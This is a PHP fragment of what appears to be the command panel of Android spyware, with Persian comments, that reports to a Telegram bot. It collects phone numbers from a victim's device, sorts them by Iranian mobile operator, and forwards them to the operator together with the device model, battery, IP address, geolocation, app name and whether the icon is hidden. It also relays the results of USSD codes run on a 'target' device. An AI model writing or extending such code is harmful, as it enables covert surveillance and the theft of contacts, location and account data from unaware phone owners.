        // تبدیل به فرمت 0xxxxxxxxxx
        if (substr($cleanNum, 0, 2) == '98') {
            $cleanNum = '0' . substr($cleanNum, 2);
        } elseif (substr($cleanNum, 0, 1) != '0' && strlen($cleanNum) == 10) {
            $cleanNum = '0' . $cleanNum;
        }
        
        // فیلتر شماره‌های نامعتبر
        if (strlen($cleanNum) < 10 || 
            strlen($cleanNum) > 11 || 
            !is_numeric($cleanNum) ||
            in_array($cleanNum, ['', '0', '00', '000', '0000', '00000', '000000', '0000000', '00000000', '000000000', '0000000000']) ||
            preg_match('/^0{2,}/', $cleanNum) ||
            preg_match('/(\d)\1{7,}/', $cleanNum)) {
            continue;
        }
        
        $validNumbers[] = $cleanNum;
    }
    
    // حذف تکراری‌ها بعد از فیلتر کردن
    $uniqueNumbers = array_unique($validNumbers);
    
    $message = "📞 ᴀᴄᴛɪᴏɴ #ᴘʜᴏɴᴇꜱ\n";
    $message .= "☎️ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀꜱ : \n\n";
    
    if (empty($uniqueNumbers)) {
        $message .= "❌ شماره ای یافت نشد\n\n";
    } else {
        // سیستم تشخیص اپراتور
        $mciNumbers = []; $mtnNumbers = []; $rightelNumbers = []; $taliyaNumbers = []; $shatelNumbers = []; $unknownNumbers = [];
        
        foreach ($uniqueNumbers as $cleanNum) {
            // تشخیص اپراتور
            $operatorType = 'Unknown';
            
            if (strlen($cleanNum) == 11 && substr($cleanNum, 0, 1) == '0') {
                $prefix = substr($cleanNum, 1, 3);
                $numericPrefix = intval($prefix);
                
                // همراه اول: 910-919
                if ($numericPrefix >= 910 && $numericPrefix <= 919) {
                    $operatorType = 'MCI';
                }
                // ایرانسل: 930-939, 990-999
                elseif (($numericPrefix >= 930 && $numericPrefix <= 939) || ($numericPrefix >= 990 && $numericPrefix <= 999)) {
                    $operatorType = 'MTN';
                }
                // رایتل: 920-923
                elseif ($numericPrefix >= 920 && $numericPrefix <= 923) {
                    $operatorType = 'Rightel';
                }
                // تالیا: 932
                elseif ($numericPrefix == 932) {
                    $operatorType = 'Taliya';
                }
                // شاتل: 901, 902, 998, 999
                elseif (in_array($prefix, ['901', '902', '998', '999'])) {
                    $operatorType = 'Shatel';
                }
            }
            
            // دسته‌بندی شماره‌ها
            switch($operatorType) {
                case 'MCI':
                    $mciNumbers[] = $cleanNum;
                    break;
                case 'MTN':
                    $mtnNumbers[] = $cleanNum;
                    break;
                case 'Rightel':
                    $rightelNumbers[] = $cleanNum;
                    break;
                case 'Taliya':
                    $taliyaNumbers[] = $cleanNum;
                    break;
                case 'Shatel':
                    $shatelNumbers[] = $cleanNum;
                    break;
                default:
                    $unknownNumbers[] = $cleanNum;
            }
        }
        
        // نمایش بر اساس اپراتور
        if (!empty($mciNumbers)) {
            $message .= "📱 همراه اول\n";
            foreach ($mciNumbers as $i => $num) {
                $message .= "  " . ($i+1) . " - <code>" . $num . "</code>\n";
            }
            $message .= "\n";
        }
        
        if (!empty($mtnNumbers)) {
            $message .= "📱 ایرانسل\n";
            foreach ($mtnNumbers as $i => $num) {
                $message .= "  " . ($i+1) . " - <code>" . $num . "</code>\n";
            }
            $message .= "\n";
        }
        
        if (!empty($rightelNumbers)) {
            $message .= "📱 رایتل\n";
            foreach ($rightelNumbers as $i => $num) {
                $message .= "  " . ($i+1) . " - <code>" . $num . "</code>\n";
            }
            $message .= "\n";
        }
        
        if (!empty($taliyaNumbers)) {
            $message .= "📱 تالیا\n";
            foreach ($taliyaNumbers as $i => $num) {
                $message .= "  " . ($i+1) . " - <code>" . $num . "</code>\n";
            }
            $message .= "\n";
        }
        
        if (!empty($shatelNumbers)) {
            $message .= "📱 شاتل\n";
            foreach ($shatelNumbers as $i => $num) {
                $message .= "  " . ($i+1) . " - <code>" . $num . "</code>\n";
            }
            $message .= "\n";
        }
        
        if (!empty($unknownNumbers)) {
            $message .= "📱 ناشناس\n";
            foreach ($unknownNumbers as $i => $num) {
                $message .= "  " . ($i+1) . " - <code>" . $num . "</code>\n";
            }
            $message .= "\n";
        }
    }
    
    $message .= "┌ <b>ᴅᴇᴠɪᴄᴇ</b>: <code>$Model</code>\n";
    $message .= "├ <b>ᴘᴏᴡᴇʀ</b>: <code>" . ($Battery ?? 'N/A') . "%</code>\n";
    $message .= "├ <b>ᴀɴᴅʀᴏɪᴅ</b>: <code>" . ($os ?? 'Unknown') . "</code>\n";
    $message .= "├ <b>ɴᴇᴛᴡᴏʀᴋ</b>: <code>$current_operator</code>\n";
    $message .= "├ <b>ᴀᴅᴅʀᴇꜱꜱ</b>: <code>$display_ip</code>\n";
    $message .= "├ <b>ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ</b>: <code>" . (file_exists("user/appname-$Device_id.txt") ? file_get_contents("user/appname-$Device_id.txt") : 'Unknown') . "</code>\n";
    $message .= "├ <b>ɢᴇᴏ</b>: <code>" . ($gcx['city'] ?? 'Unknown') . ", " . ($gcx['country'] ?? 'Unknown') . " $flag</code>\n";
    $message .= "├ <b>ᴘᴀɴᴇʟ</b>: /set_$Device_id\n";
    $message .= "└ <b>ꜱᴇᴄᴜʀɪᴛʏ</b>: <code>ɪᴄᴏɴ:" . (file_get_contents("user/$Device_id-apk.txt")) . " | ꜱᴄʀᴇᴇɴ:" . (file_get_contents("user/$Device_id-offline.txt") == "ON" ? "OFF" : "ON") . "</code>\n\n";
    $message .= "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>";

    smg($id_sender, $message, $sms_panel);
} elseif ($action == "ussdcallback") {
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    smg($id_sender, "
<b>💰 ᴛᴀʀɢᴇᴛ #ᴜꜱꜱᴅ_ʀᴇꜱᴜʟᴛ</b> :
\n <b>$message_ussd</b>


<b>🚏 ғɪʀsᴛ ɪᴘ</b> : <code>$install_ip</code>
🗃️ ᴘᴀɴᴇʟ<code>/set_$Device_id</code> • ]

<b>👨‍🔧 ᴅᴇᴠᴇʟᴏᴘᴇʀ : @im_saeedi</b>", $sms_panel);
}